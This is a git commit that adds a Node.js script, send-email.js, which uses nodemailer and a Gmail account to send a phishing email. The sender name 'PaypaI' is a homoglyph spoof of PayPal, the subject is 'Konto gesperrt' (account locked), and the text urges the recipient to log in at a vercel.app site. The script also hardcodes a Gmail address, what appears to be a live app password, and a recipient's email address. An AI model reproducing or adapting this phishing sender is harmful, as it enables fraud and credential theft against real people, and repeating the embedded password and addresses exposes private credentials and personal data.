b7eac5306ccdee8685b2493869418c6635771e15
vs5jwnpdzn-coder <vs5jwnpdzn@privaterelay.appleid.com>
2026-01-05 03:41:01 +0100

    e

---
+++ send-email.js
@@ -0,0 +1,31 @@
+const nodemailer = require("nodemailer");
+const fs = require("fs");
+
+const html = fs.readFileSync("./mail.html", "utf8");
+
+// TODO: HIER EINTRAGEN
+const GMAIL_USER = "holzerluis3@gmail.com";
+const GMAIL_APP_PASS = "zcgyiglaavyxobem";
+const TO = "jonasbenz25@gmail.com";
+
+async function main() {
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: { user: GMAIL_USER, pass: GMAIL_APP_PASS },
+  });
+
+  const info = await transporter.sendMail({
+    from: `"PaypaI" <${GMAIL_USER}>`,
+    to: TO,
+    subject: "Konto gesperrt",
+    html,
+    text: "Bitte logge dich ein und folge den Anweisungen auf unserer Website. https://pp-five-silk.vercel.app/ ",
+  });
+
+  console.log("Gesendet:", info.messageId);
+}
+
+main().catch((err) => {
+  console.error("Fehler:", err);
+  process.exit(1);
+});
